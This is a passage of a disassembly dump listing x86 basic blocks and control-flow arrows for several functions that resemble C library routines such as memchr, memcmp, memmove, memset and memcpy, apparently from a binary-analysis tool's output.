0xb07c04f:	mov	dword ptr [esp + 8], eax
0xb07c053:	mov	eax, dword ptr [esp + 0x20]
0xb07c057:	add	eax, ecx
0xb07c059:	mov	dword ptr [esp], eax
0xb07c05c:	call	0xb07c430
None
|
|
|
v
0xb07bd62:	test	eax, eax
0xb07bd64:	mov	ecx, eax
0xb07bd66:	mov	dword ptr [esp + 0x20], eax
0xb07bd6a:	je	0xb07be70
None
|
|
|
v
0xb07bd39:	mov	eax, dword ptr [esp + 0x84]
0xb07bd40:	mov	edi, esi
0xb07bd42:	sub	edi, dword ptr [esp + 0x84]
0xb07bd49:	movsx	eax, byte ptr [eax]
0xb07bd4c:	mov	dword ptr [esp + 4], eax
0xb07bd50:	mov	eax, dword ptr [esp + 0x80]
0xb07bd57:	add	eax, 1
0xb07bd5a:	mov	dword ptr [esp], eax
0xb07bd5d:	call	0xb07a520
None
|
|
|
v
0xb07c0a3:	mov	edi, dword ptr [esp + 0x38]
0xb07c0a7:	lea	esi, dword ptr [eax + 2]
0xb07c0aa:	movzx	eax, byte ptr [eax + 1]
0xb07c0ae:	cmp	byte ptr [edi], al
0xb07c0b0:	jne	0xb07c178
None
|
|
|
v
0xb07c080:	mov	eax, ecx
0xb07c082:	movzx	edx, byte ptr [eax]
0xb07c085:	lea	ecx, dword ptr [eax + 1]
0xb07c088:	cmp	byte ptr [esp + 0x18], dl
0xb07c08c:	jne	0xb07be68
None
|
|
|
v
0xb07c004:	mov	eax, ecx
0xb07c006:	nop	
0xb07c008:	mov	edx, dword ptr [esp + 0x1c]
0xb07c00c:	add	edx, dword ptr [esp + 0x34]
0xb07c010:	mov	dword ptr [esp + 0x24], 0
0xb07c018:	add	eax, edx
0xb07c01a:	mov	dword ptr [esp + 0x1c], eax
0xb07c01e:	jmp	0xb07bffb
None
|
|
|
v
0xb07bf4b:	movzx	eax, byte ptr [edx]
0xb07bf4e:	cmp	byte ptr [esi], al
0xb07bf50:	jne	0xb07c004
None
|
|
|
v
0xb07bf56:	lea	eax, dword ptr [ecx + 1]
0xb07bf59:	neg	ecx
0xb07bf5b:	add	esi, ecx
0xb07bf5d:	add	ecx, edx
0xb07bf5f:	mov	ebp, ecx
0xb07bf61:	jmp	0xb07bf7a
None
|
|
|
v
0xb07bdbf:	mov	eax, dword ptr [esp + 0x28]
0xb07bdc3:	mov	ecx, dword ptr [esp + 0x20]
0xb07bdc7:	mov	edx, dword ptr [esp + 0x2c]
0xb07bdcb:	add	ecx, eax
0xb07bdcd:	mov	dword ptr [esp + 0x34], ecx
0xb07bdd1:	mov	ecx, eax
0xb07bdd3:	movzx	eax, byte ptr [edx + eax]
0xb07bdd7:	mov	byte ptr [esp + 0x18], al
0xb07bddb:	mov	eax, ecx
0xb07bddd:	add	eax, 1
0xb07bde0:	cmp	ebp, eax
0xb07bde2:	mov	dword ptr [esp + 0x30], eax
0xb07bde6:	jae	0xb07be10
None
|
|
|
v
0xb07bd2c:	mov	ecx, ebp
0xb07bd2e:	mov	eax, dword ptr [esp + 0x80]
0xb07bd35:	test	cl, cl
0xb07bd37:	jne	0xb07bdb7
None
|
|
|
v
0xb07bffb:	mov	ebp, dword ptr [esp + 0x30]
0xb07bfff:	jmp	0xb07bef0
None
|
|
|
v
0xb07bde8:	sub	esi, ebp
0xb07bdea:	mov	eax, ecx
0xb07bdec:	add	eax, esi
0xb07bdee:	mov	dword ptr [esp + 8], eax
0xb07bdf2:	mov	eax, dword ptr [esp + 0x20]
0xb07bdf6:	mov	dword ptr [esp + 4], 0
0xb07bdfe:	add	eax, ebp
0xb07be00:	mov	dword ptr [esp], eax
0xb07be03:	call	0xb07c430
None
|
|
|
v
0xb07be80:	lea	eax, dword ptr [esp + 0x5c]
0xb07be84:	mov	edx, edi
0xb07be86:	mov	dword ptr [esp], eax
0xb07be89:	mov	eax, dword ptr [esp + 0x2c]
0xb07be8d:	call	0xb07b750
None
|
|
|
v
0xb07c092:	sub	ecx, dword ptr [esp + 0x34]
0xb07c096:	cmp	ebp, dword ptr [esp + 0x30]
0xb07c09a:	lea	edi, dword ptr [ecx - 1]
0xb07c09d:	mov	dword ptr [esp + 0x1c], edi
0xb07c0a1:	jbe	0xb07c0e0
None
|
|
|
v
0xb07bf1e:	test	esi, esi
0xb07bf20:	je	0xb07be70
None
|
|
|
v
0xb07c061:	test	eax, eax
0xb07c063:	jne	0xb07be70
None
|
|
|
v
0xb07c15b:	mov	esi, dword ptr [esp + 0x84]
0xb07c162:	mov	ebp, 1
0xb07c167:	jmp	0xb07bd23
None
|
|
|
v
0xb07bd08:	movzx	edx, byte ptr [esi]
0xb07bd0b:	test	dl, dl
0xb07bd0d:	je	0xb07bd2c
None
|
|
|
v
0xb07be61:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb07c028:	cmp	ebp, eax
0xb07c02a:	jbe	0xb07c0e0
None
|
|
|
v
0xb07bfeb:	mov	eax, dword ptr [esp + 0x3c]
0xb07bfef:	mov	esi, edi
0xb07bff1:	add	dword ptr [esp + 0x1c], eax
0xb07bff5:	sub	esi, eax
0xb07bff7:	mov	dword ptr [esp + 0x24], esi
0xb07bffb:	mov	ebp, dword ptr [esp + 0x30]
0xb07bfff:	jmp	0xb07bef0
None
|
|
|
v
0xb07be10:	mov	esi, dword ptr [esp + 0x28]
0xb07be14:	mov	eax, edi
0xb07be16:	mov	ecx, dword ptr [esp + 0x2c]
0xb07be1a:	mov	dword ptr [esp + 0x24], ebp
0xb07be1e:	mov	ebp, edi
0xb07be20:	sub	eax, esi
0xb07be22:	cmp	eax, esi
0xb07be24:	cmovb	eax, esi
0xb07be27:	add	eax, 1
0xb07be2a:	mov	dword ptr [esp + 0x5c], eax
0xb07be2e:	lea	edx, dword ptr [esi - 1]
0xb07be31:	neg	esi
0xb07be33:	mov	dword ptr [esp + 0x4c], eax
0xb07be37:	mov	eax, dword ptr [esp + 0x34]
0xb07be3b:	add	ecx, dword ptr [esp + 0x30]
0xb07be3f:	mov	dword ptr [esp + 0x44], edx
0xb07be43:	mov	dword ptr [esp + 0x3c], esi
0xb07be47:	movzx	edx, byte ptr [eax]
0xb07be4a:	mov	dword ptr [esp + 0x38], ecx
0xb07be4e:	add	ecx, esi
0xb07be50:	cmp	byte ptr [esp + 0x18], dl
0xb07be54:	mov	dword ptr [esp + 0x40], ecx
0xb07be58:	lea	ecx, dword ptr [eax + 1]
0xb07be5b:	je	0xb07c092
None
|
|
|
v
0xb07c178:	test	al, al
0xb07c17a:	je	0xb07be70
None
|
|
|
v
0xb07c139:	mov	ebp, dword ptr [esp + 0x48]
0xb07c13d:	test	dl, dl
0xb07c13f:	je	0xb07be70
None
|
|
|
v
0xb07c030:	mov	edi, dword ptr [esp + 0x1c]
0xb07c034:	sub	edi, dword ptr [esp + 0x28]
0xb07c038:	lea	edi, dword ptr [eax + edi + 1]
0xb07c03c:	mov	ecx, dword ptr [esp + 0x24]
0xb07c040:	lea	esi, dword ptr [edi + ebp]
0xb07c043:	mov	eax, esi
0xb07c045:	mov	dword ptr [esp + 4], 0
0xb07c04d:	sub	eax, ecx
0xb07c04f:	mov	dword ptr [esp + 8], eax
0xb07c053:	mov	eax, dword ptr [esp + 0x20]
0xb07c057:	add	eax, ecx
0xb07c059:	mov	dword ptr [esp], eax
0xb07c05c:	call	0xb07c430
None
|
|
|
v
0xb07be68:	test	dl, dl
0xb07be6a:	jne	0xb07c080
None
|
|
|
v
0xb07c0c8:	movzx	ecx, byte ptr [eax + esi - 2]
0xb07c0cd:	lea	edx, dword ptr [eax + 1]
0xb07c0d0:	cmp	byte ptr [edi + eax - 1], cl
0xb07c0d4:	jne	0xb07c020
None
|
|
|
v
0xb07bd70:	cmp	edi, 1
0xb07bd73:	je	0xb07c189
None
|
|
|
v
0xb07bce4:	mov	edi, dword ptr [esp + 0x84]
0xb07bceb:	movzx	edx, byte ptr [edi]
0xb07bcee:	test	dl, dl
0xb07bcf0:	je	0xb07c16c
None
|
|
|
v
0xb07c0b6:	mov	eax, dword ptr [esp + 0x28]
0xb07c0ba:	add	esi, dword ptr [esp + 0x3c]
0xb07c0be:	mov	edi, dword ptr [esp + 0x40]
0xb07c0c2:	add	eax, 2
0xb07c0c5:	jmp	0xb07c0dc
None
|
|
|
v
0xb07c16c:	mov	eax, dword ptr [esp + 0x80]
0xb07c173:	jmp	0xb07bdb7
None
|
|
|
v
0xb07be92:	mov	ecx, dword ptr [esp + 0x2c]
0xb07be96:	mov	edx, dword ptr [esp + 0x5c]
0xb07be9a:	mov	dword ptr [esp], ecx
0xb07be9d:	mov	dword ptr [esp + 0x3c], edx
0xb07bea1:	mov	dword ptr [esp + 0x28], eax
0xb07bea5:	mov	dword ptr [esp + 8], eax
0xb07bea9:	mov	eax, ecx
0xb07beab:	add	eax, edx
0xb07bead:	mov	dword ptr [esp + 4], eax
0xb07beb1:	call	0xb07c620
None
|
|
|
v
0xb07bfc0:	mov	edx, dword ptr [esp + 0x18]
0xb07bfc4:	movzx	edx, byte ptr [edx + eax - 1]
0xb07bfc9:	sub	eax, 1
0xb07bfcc:	cmp	dl, byte ptr [ecx + eax]
0xb07bfcf:	jne	0xb07bfd8
None
|
|
|
v
0xb07bd23:	cmp	byte ptr [esi], 0
0xb07bd26:	jne	0xb07be70
None
|
|
|
v
0xb07bf16:	test	eax, eax
0xb07bf18:	jne	0xb07be70
None
|
|
|
v
0xb07c152:	mov	esi, dword ptr [esp + 0x28]
0xb07c156:	jmp	0xb07bfdc
None
|
|
|
v
0xb07c180:	mov	eax, dword ptr [esp + 0x30]
0xb07c184:	jmp	0xb07c030
None
|
|
|
v
0xb07c071:	mov	eax, dword ptr [esp + 0x28]
0xb07c075:	mov	dword ptr [esp + 0x24], esi
0xb07c079:	lea	ecx, dword ptr [edi + eax]
0xb07c07c:	add	ecx, dword ptr [esp + 0x20]
0xb07c080:	mov	eax, ecx
0xb07c082:	movzx	edx, byte ptr [eax]
0xb07c085:	lea	ecx, dword ptr [eax + 1]
0xb07c088:	cmp	byte ptr [esp + 0x18], dl
0xb07c08c:	jne	0xb07be68
None
|
|
|
v
0xb07c020:	test	cl, cl
0xb07c022:	je	0xb07be70
None
|
|
|
v
0xb07c069:	test	esi, esi
0xb07c06b:	je	0xb07be70
None
|
|
|
v
0xb07be08:	test	eax, eax
0xb07be0a:	jne	0xb07be70
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07c430
TOTAL BLOCKS :45
0xb07c554:	mov	ecx, dword ptr [eax]
0xb07c556:	mov	edi, 0xfefefeff
0xb07c55b:	xor	ecx, edx
0xb07c55d:	add	edi, ecx
0xb07c55f:	jae	0xb07c5b5
None
|
|
|
v
0xb07c59c:	cmp	byte ptr [eax], dl
0xb07c59e:	je	0xb07c5c8
None
|
|
|
v
0xb07c523:	add	eax, 0x10
0xb07c526:	sub	esi, 0x10
0xb07c529:	jae	0xb07c4a0
None
|
|
|
v
0xb07c491:	inc	eax
0xb07c492:	dec	esi
0xb07c493:	jmp	0xb07c526
None
|
|
|
v
0xb07c489:	cmp	byte ptr [eax], dl
0xb07c48b:	je	0xb07c5c8
None
|
|
|
v
0xb07c4c0:	mov	ecx, dword ptr [eax + 4]
0xb07c4c3:	mov	edi, 0xfefefeff
0xb07c4c8:	xor	ecx, edx
0xb07c4ca:	add	edi, ecx
0xb07c4cc:	jae	0xb07c5b2
None
|
|
|
v
0xb07c447:	mov	dh, dl
0xb07c449:	mov	ecx, edx
0xb07c44b:	shl	edx, 0x10
0xb07c44e:	mov	dx, cx
0xb07c451:	test	al, 3
0xb07c453:	je	0xb07c526
None
|
|
|
v
0xb07c598:	inc	eax
0xb07c599:	dec	esi
0xb07c59a:	je	0xb07c5a8
None
|
|
|
v
0xb07c5b2:	add	eax, 4
0xb07c5b5:	test	cl, cl
0xb07c5b7:	je	0xb07c5c8
None
|
|
|
v
0xb07c5af:	add	eax, 4
0xb07c5b2:	add	eax, 4
0xb07c5b5:	test	cl, cl
0xb07c5b7:	je	0xb07c5c8
None
|
|
|
v
0xb07c58f:	and	esi, 3
0xb07c592:	je	0xb07c5a8
None
|
|
|
v
0xb07c5a8:	xor	eax, eax
0xb07c5aa:	jmp	0xb07c5c8
None
|
|
|
v
0xb07c574:	mov	ecx, dword ptr [eax]
0xb07c576:	mov	edi, 0xfefefeff
0xb07c57b:	xor	ecx, edx
0xb07c57d:	add	edi, ecx
0xb07c57f:	jae	0xb07c5b5
None
|
|
|
v
0xb07c526:	sub	esi, 0x10
0xb07c529:	jae	0xb07c4a0
None
|
|
|
v
0xb07c581:	xor	edi, ecx
0xb07c583:	or	edi, 0xfefefeff
0xb07c589:	inc	edi
0xb07c58a:	jne	0xb07c5b5
None
|
|
|
v
0xb07c5b9:	inc	eax
0xb07c5ba:	test	ch, ch
0xb07c5bc:	je	0xb07c5c8
None
|
|
|
v
0xb07c502:	mov	ecx, dword ptr [eax + 0xc]
0xb07c505:	mov	edi, 0xfefefeff
0xb07c50a:	xor	ecx, edx
0xb07c50c:	add	edi, ecx
0xb07c50e:	jae	0xb07c5ac
None
|
|
|
v
0xb07c481:	test	al, 3
0xb07c483:	je	0xb07c526
None
|
|
|
v
0xb07c5c7:	inc	eax
0xb07c5c8:	pop	edi
0xb07c5c9:	pop	esi
0xb07c5ca:	ret	
None
|
|
|
v
0xb07c5ac:	add	eax, 4
0xb07c5af:	add	eax, 4
0xb07c5b2:	add	eax, 4
0xb07c5b5:	test	cl, cl
0xb07c5b7:	je	0xb07c5c8
None
|
|
|
v
0xb07c561:	xor	edi, ecx
0xb07c563:	or	edi, 0xfefefeff
0xb07c569:	inc	edi
0xb07c56a:	jne	0xb07c5b5
None
|
|
|
v
0xb07c594:	cmp	byte ptr [eax], dl
0xb07c596:	je	0xb07c5c8
None
|
|
|
v
0xb07c4b1:	xor	edi, ecx
0xb07c4b3:	or	edi, 0xfefefeff
0xb07c4b9:	inc	edi
0xb07c4ba:	jne	0xb07c5b5
None
|
|
|
v
0xb07c4d2:	xor	edi, ecx
0xb07c4d4:	or	edi, 0xfefefeff
0xb07c4da:	inc	edi
0xb07c4db:	jne	0xb07c5b2
None
|
|
|
v
0xb07c5be:	inc	eax
0xb07c5bf:	test	ecx, 0xff0000
0xb07c5c5:	je	0xb07c5c8
None
|
|
|
v
0xb07c5a4:	cmp	byte ptr [eax], dl
0xb07c5a6:	je	0xb07c5c8
None
|
|
|
v
0xb07c5c8:	pop	edi
0xb07c5c9:	pop	esi
0xb07c5ca:	ret	
None
|
|
|
v
0xb07c4a0:	mov	ecx, dword ptr [eax]
0xb07c4a2:	mov	edi, 0xfefefeff
0xb07c4a7:	xor	ecx, edx
0xb07c4a9:	add	edi, ecx
0xb07c4ab:	jae	0xb07c5b5
None
|
|
|
v
0xb07c461:	inc	eax
0xb07c462:	dec	esi
0xb07c463:	je	0xb07c5a8
None
|
|
|
v
0xb07c5a0:	inc	eax
0xb07c5a1:	dec	esi
0xb07c5a2:	je	0xb07c5a8
None
|
|
|
v
0xb07c459:	cmp	byte ptr [eax], dl
0xb07c45b:	je	0xb07c5c8
None
|
|
|
v
0xb07c541:	xor	edi, ecx
0xb07c543:	or	edi, 0xfefefeff
0xb07c549:	inc	edi
0xb07c54a:	jne	0xb07c5b5
None
|
|
|
v
0xb07c514:	xor	edi, ecx
0xb07c516:	or	edi, 0xfefefeff
0xb07c51c:	inc	edi
0xb07c51d:	jne	0xb07c5ac
None
|
|
|
v
0xb07c56c:	add	eax, 4
0xb07c56f:	cmp	esi, 0xfc
0xb07c572:	jb	0xb07c58f
None
|
|
|
v
0xb07c534:	mov	ecx, dword ptr [eax]
0xb07c536:	mov	edi, 0xfefefeff
0xb07c53b:	xor	ecx, edx
0xb07c53d:	add	edi, ecx
0xb07c53f:	jae	0xb07c5b5
None
|
|
|
v
0xb07c4e1:	mov	ecx, dword ptr [eax + 8]
0xb07c4e4:	mov	edi, 0xfefefeff
0xb07c4e9:	xor	ecx, edx
0xb07c4eb:	add	edi, ecx
0xb07c4ed:	jae	0xb07c5af
None
|
|
|
v
0xb07c471:	cmp	byte ptr [eax], dl
0xb07c473:	je	0xb07c5c8
None
|
|
|
v
0xb07c52f:	cmp	esi, 0xf4
0xb07c532:	jb	0xb07c58f
None
|
|
|
v
0xb07c469:	test	al, 3
0xb07c46b:	je	0xb07c526
None
|
|
|
v
0xb07c430:	push	esi
0xb07c431:	push	edi
0xb07c432:	mov	eax, dword ptr [esp + 0xc]
0xb07c436:	mov	edx, dword ptr [esp + 0x10]
0xb07c43a:	mov	esi, dword ptr [esp + 0x14]
0xb07c43e:	cmp	esi, 4
0xb07c441:	jb	0xb07c58f
None
|
|
|
v
0xb07c4f3:	xor	edi, ecx
0xb07c4f5:	or	edi, 0xfefefeff
0xb07c4fb:	inc	edi
0xb07c4fc:	jne	0xb07c5af
None
|
|
|
v
0xb07c5b5:	test	cl, cl
0xb07c5b7:	je	0xb07c5c8
None
|
|
|
v
0xb07c479:	inc	eax
0xb07c47a:	dec	esi
0xb07c47b:	je	0xb07c5a8
None
|
|
|
v
0xb07c54c:	add	eax, 4
0xb07c54f:	cmp	esi, 0xf8
0xb07c552:	jb	0xb07c58f
None
|
|
|
v
0xb07c58c:	add	eax, 4
0xb07c58f:	and	esi, 3
0xb07c592:	je	0xb07c5a8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07c620
TOTAL BLOCKS :31
0xb07c891:	mov	eax, dword ptr [esi + 0x18]
0xb07c894:	cmp	eax, dword ptr [edx + 0x18]
0xb07c897:	jne	0xb07c8c3
None
|
|
|
v
0xb07c889:	mov	eax, dword ptr [esi + 0x14]
0xb07c88c:	cmp	eax, dword ptr [edx + 0x14]
0xb07c88f:	jne	0xb07c8c6
None
|
|
|
v
0xb07c632:	movzx	ecx, byte ptr [eax]
0xb07c635:	cmp	cl, byte ptr [edx]
0xb07c637:	jne	0xb07c63d
None
|
|
|
v
0xb07c860:	sub	ecx, 0x20
0xb07c863:	mov	eax, dword ptr [esi]
0xb07c865:	cmp	eax, dword ptr [edx]
0xb07c867:	jne	0xb07c8d5
None
|
|
|
v
0xb07c8db:	cmp	ah, ch
0xb07c8dd:	jne	0xb07c8eb
None
|
|
|
v
0xb07c644:	jl	0xb07c639
None
|
|
|
v
0xb07c646:	push	esi
0xb07c647:	mov	esi, eax
0xb07c649:	cmp	ecx, 0x20
0xb07c64c:	jge	0xb07c860
None
|
|
|
v
0xb07c899:	mov	eax, dword ptr [esi + 0x1c]
0xb07c89c:	cmp	eax, dword ptr [edx + 0x1c]
0xb07c89f:	jne	0xb07c8c0
None
|
|
|
v
0xb07c8df:	shr	eax, 0x10
0xb07c8e2:	shr	ecx, 0x10
0xb07c8e5:	cmp	al, cl
0xb07c8e7:	jne	0xb07c8eb
None
|
|
|
v
0xb07c8ac:	call	0xb1267db
None
|
|
|
v
0xb07c8cc:	add	edx, 4
0xb07c8cf:	add	edx, 4
0xb07c8d2:	add	edx, 4
0xb07c8d5:	mov	ecx, dword ptr [edx]
0xb07c8d7:	cmp	al, cl
0xb07c8d9:	jne	0xb07c8eb
None
|
|
|
v
0xb07c8c9:	add	edx, 4
0xb07c8cc:	add	edx, 4
0xb07c8cf:	add	edx, 4
0xb07c8d2:	add	edx, 4
0xb07c8d5:	mov	ecx, dword ptr [edx]
0xb07c8d7:	cmp	al, cl
0xb07c8d9:	jne	0xb07c8eb
None
|
|
|
v
0xb07c8e9:	cmp	eax, ecx
0xb07c8eb:	sbb	eax, eax
0xb07c8ed:	sbb	eax, -1
0xb07c8f0:	pop	esi
0xb07c8f1:	pop	ebx
0xb07c8f2:	ret	
None
|
|
|
v
0xb07c8a1:	add	esi, 0x20
0xb07c8a4:	add	edx, 0x20
0xb07c8a7:	cmp	ecx, 0x20
0xb07c8aa:	jge	0xb07c860
None
|
|
|
v
0xb07c8b1:	add	ebx, 0xdf5bf
0xb07c8b7:	add	ebx, dword ptr [ebx + ecx*4]
0xb07c8ba:	add	edx, ecx
0xb07c8bc:	add	esi, ecx
0xb07c8be:	jmp	ebx
None
|
|
|
v
0xb07c8c3:	add	edx, 4
0xb07c8c6:	add	edx, 4
0xb07c8c9:	add	edx, 4
0xb07c8cc:	add	edx, 4
0xb07c8cf:	add	edx, 4
0xb07c8d2:	add	edx, 4
0xb07c8d5:	mov	ecx, dword ptr [edx]
0xb07c8d7:	cmp	al, cl
0xb07c8d9:	jne	0xb07c8eb
None
|
|
|
v
0xb07c8c0:	add	edx, 4
0xb07c8c3:	add	edx, 4
0xb07c8c6:	add	edx, 4
0xb07c8c9:	add	edx, 4
0xb07c8cc:	add	edx, 4
0xb07c8cf:	add	edx, 4
0xb07c8d2:	add	edx, 4
0xb07c8d5:	mov	ecx, dword ptr [edx]
0xb07c8d7:	cmp	al, cl
0xb07c8d9:	jne	0xb07c8eb
None
|
|
|
v
0xb07c639:	xor	eax, eax
0xb07c63b:	pop	ebx
0xb07c63c:	ret	
None
|
|
|
v
0xb07c8eb:	sbb	eax, eax
0xb07c8ed:	sbb	eax, -1
0xb07c8f0:	pop	esi
0xb07c8f1:	pop	ebx
0xb07c8f2:	ret	
None
|
|
|
v
0xb07c8c6:	add	edx, 4
0xb07c8c9:	add	edx, 4
0xb07c8cc:	add	edx, 4
0xb07c8cf:	add	edx, 4
0xb07c8d2:	add	edx, 4
0xb07c8d5:	mov	ecx, dword ptr [edx]
0xb07c8d7:	cmp	al, cl
0xb07c8d9:	jne	0xb07c8eb
None
|
|
|
v
0xb07c8d5:	mov	ecx, dword ptr [edx]
0xb07c8d7:	cmp	al, cl
0xb07c8d9:	jne	0xb07c8eb
None
|
|
|
v
0xb07c8cf:	add	edx, 4
0xb07c8d2:	add	edx, 4
0xb07c8d5:	mov	ecx, dword ptr [edx]
0xb07c8d7:	cmp	al, cl
0xb07c8d9:	jne	0xb07c8eb
None
|
|
|
v
0xb07c871:	mov	eax, dword ptr [esi + 8]
0xb07c874:	cmp	eax, dword ptr [edx + 8]
0xb07c877:	jne	0xb07c8cf
None
|
|
|
v
0xb07c63d:	sbb	eax, eax
0xb07c63f:	sbb	eax, -1
0xb07c642:	pop	ebx
0xb07c643:	ret	
None
|
|
|
v
0xb07c652:	call	0xb1267db
None
|
|
|
v
0xb07c620:	push	ebx
0xb07c621:	mov	eax, dword ptr [esp + 8]
0xb07c625:	mov	edx, dword ptr [esp + 0xc]
0xb07c629:	mov	ecx, dword ptr [esp + 0x10]
0xb07c62d:	cmp	ecx, 1
0xb07c630:	jne	0xb07c644
None
|
|
|
v
0xb07c881:	mov	eax, dword ptr [esi + 0x10]
0xb07c884:	cmp	eax, dword ptr [edx + 0x10]
0xb07c887:	jne	0xb07c8c9
None
|
|
|
v
0xb07c657:	add	ebx, 0xdf819
0xb07c65d:	add	ebx, dword ptr [ebx + ecx*4]
0xb07c660:	add	edx, ecx
0xb07c662:	add	esi, ecx
0xb07c664:	jmp	ebx
None
|
|
|
v
0xb07c8d2:	add	edx, 4
0xb07c8d5:	mov	ecx, dword ptr [edx]
0xb07c8d7:	cmp	al, cl
0xb07c8d9:	jne	0xb07c8eb
None
|
|
|
v
0xb07c879:	mov	eax, dword ptr [esi + 0xc]
0xb07c87c:	cmp	eax, dword ptr [edx + 0xc]
0xb07c87f:	jne	0xb07c8cc
None
|
|
|
v
0xb07c869:	mov	eax, dword ptr [esi + 4]
0xb07c86c:	cmp	eax, dword ptr [edx + 4]
0xb07c86f:	jne	0xb07c8d2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07c960
TOTAL BLOCKS :14
0xb07c97c:	movsb	byte ptr es:[edi], byte ptr [esi]
0xb07c97d:	shr	ecx, 1
0xb07c97f:	jae	0xb07c983
None
|
|
|
v
0xb07c983:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07c977:	cld	
0xb07c978:	shr	ecx, 1
0xb07c97a:	jae	0xb07c97d
None
|
|
|
v
0xb07c9a5:	movsw	word ptr es:[edi], word ptr [esi]
0xb07c9a7:	sub	edi, 2
0xb07c9aa:	sub	esi, 2
0xb07c9ad:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07c98d:	std	
0xb07c98e:	lea	edi, dword ptr [edi + ecx - 1]
0xb07c992:	lea	esi, dword ptr [esi + ecx - 1]
0xb07c996:	shr	ecx, 1
0xb07c998:	jae	0xb07c99b
None
|
|
|
v
0xb07c981:	movsw	word ptr es:[edi], word ptr [esi]
0xb07c983:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07c99b:	sub	edi, 1
0xb07c99e:	sub	esi, 1
0xb07c9a1:	shr	ecx, 1
0xb07c9a3:	jae	0xb07c9a7
None
|
|
|
v
0xb07c99a:	movsb	byte ptr es:[edi], byte ptr [esi]
0xb07c99b:	sub	edi, 1
0xb07c99e:	sub	esi, 1
0xb07c9a1:	shr	ecx, 1
0xb07c9a3:	jae	0xb07c9a7
None
|
|
|
v
0xb07c985:	mov	esi, edx
0xb07c987:	mov	eax, dword ptr [esp + 8]
0xb07c98b:	pop	edi
0xb07c98c:	ret	
None
|
|
|
v
0xb07c9af:	mov	esi, edx
0xb07c9b1:	mov	eax, dword ptr [esp + 8]
0xb07c9b5:	cld	
0xb07c9b6:	pop	edi
0xb07c9b7:	ret	
None
|
|
|
v
0xb07c9ad:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07c97d:	shr	ecx, 1
0xb07c97f:	jae	0xb07c983
None
|
|
|
v
0xb07c9a7:	sub	edi, 2
0xb07c9aa:	sub	esi, 2
0xb07c9ad:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07c960:	push	edi
0xb07c961:	mov	ecx, dword ptr [esp + 0x10]
0xb07c965:	mov	edi, dword ptr [esp + 8]
0xb07c969:	mov	edx, esi
0xb07c96b:	mov	esi, dword ptr [esp + 0xc]
0xb07c96f:	mov	eax, edi
0xb07c971:	sub	eax, esi
0xb07c973:	cmp	ecx, eax
0xb07c975:	ja	0xb07c98d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07ca20
TOTAL BLOCKS :12
0xb07ca5d:	mov	eax, dword ptr [esp + 8]
0xb07ca61:	pop	edi
0xb07ca62:	ret	
None
|
|
|
v
0xb07ca47:	stosb	byte ptr es:[edi], al
0xb07ca48:	dec	ecx
0xb07ca49:	mov	edx, ecx
0xb07ca4b:	shr	ecx, 2
0xb07ca4e:	and	edx, 3
0xb07ca51:	imul	eax, eax, 0x1010101
0xb07ca57:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb07ca59:	mov	ecx, edx
0xb07ca5b:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0xb07ca31:	mov	edi, edx
0xb07ca33:	and	edx, 3
0xb07ca36:	je	0xb07ca49
None
|
|
|
v
0xb07ca57:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb07ca20:	cld	
0xb07ca21:	push	edi
0xb07ca22:	mov	edx, dword ptr [esp + 8]
0xb07ca26:	mov	ecx, dword ptr [esp + 0x10]
0xb07ca2a:	movzx	eax, byte ptr [esp + 0xc]
0xb07ca2f:	jecxz	0xb07ca5d
None
|
|
|
v
0xb07ca49:	mov	edx, ecx
0xb07ca4b:	shr	ecx, 2
0xb07ca4e:	and	edx, 3
0xb07ca51:	imul	eax, eax, 0x1010101
0xb07ca57:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb07ca38:	jp	0xb07ca3e
None
|
|
|
v
0xb07ca3e:	stosb	byte ptr es:[edi], al
0xb07ca3f:	dec	ecx
0xb07ca40:	je	0xb07ca5d
None
|
|
|
v
0xb07ca5b:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0xb07ca42:	xor	edx, 1
0xb07ca45:	jne	0xb07ca49
None
|
|
|
v
0xb07ca3a:	stosb	byte ptr es:[edi], al
0xb07ca3b:	dec	ecx
0xb07ca3c:	je	0xb07ca5d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07cad0
TOTAL BLOCKS :6
0xb07cae6:	shr	ecx, 1
0xb07cae8:	jae	0xb07caec
None
|
|
|
v
0xb07caea:	movsw	word ptr es:[edi], word ptr [esi]
0xb07caec:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07caec:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07caee:	xchg	eax, edi
0xb07caef:	mov	esi, edx
0xb07caf1:	ret	
None
|
|
|
v
0xb07cad0:	mov	ecx, dword ptr [esp + 0xc]
0xb07cad4:	mov	eax, edi
0xb07cad6:	mov	edi, dword ptr [esp + 4]
0xb07cada:	mov	edx, esi
0xb07cadc:	mov	esi, dword ptr [esp + 8]
0xb07cae0:	cld	
0xb07cae1:	shr	ecx, 1
0xb07cae3:	jae	0xb07cae6
None
|
|
|
v
0xb07cae5:	movsb	byte ptr es:[edi], byte ptr [esi]
0xb07cae6:	shr	ecx, 1
0xb07cae8:	jae	0xb07caec
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07cd00
TOTAL BLOCKS :1
0xb07cd00:	push	edi
0xb07cd01:	push	esi
0xb07cd02:	push	ebx
0xb07cd03:	mov	edi, dword ptr [esp + 0x10]
0xb07cd07:	mov	esi, dword ptr [esp + 0x14]
0xb07cd0b:	xor	eax, eax
0xb07cd0d:	lea	ecx, dword ptr [esi - 1]
0xb07cd10:	mov	ebx, 0xfefefeff
0xb07cd15:	and	ecx, 3
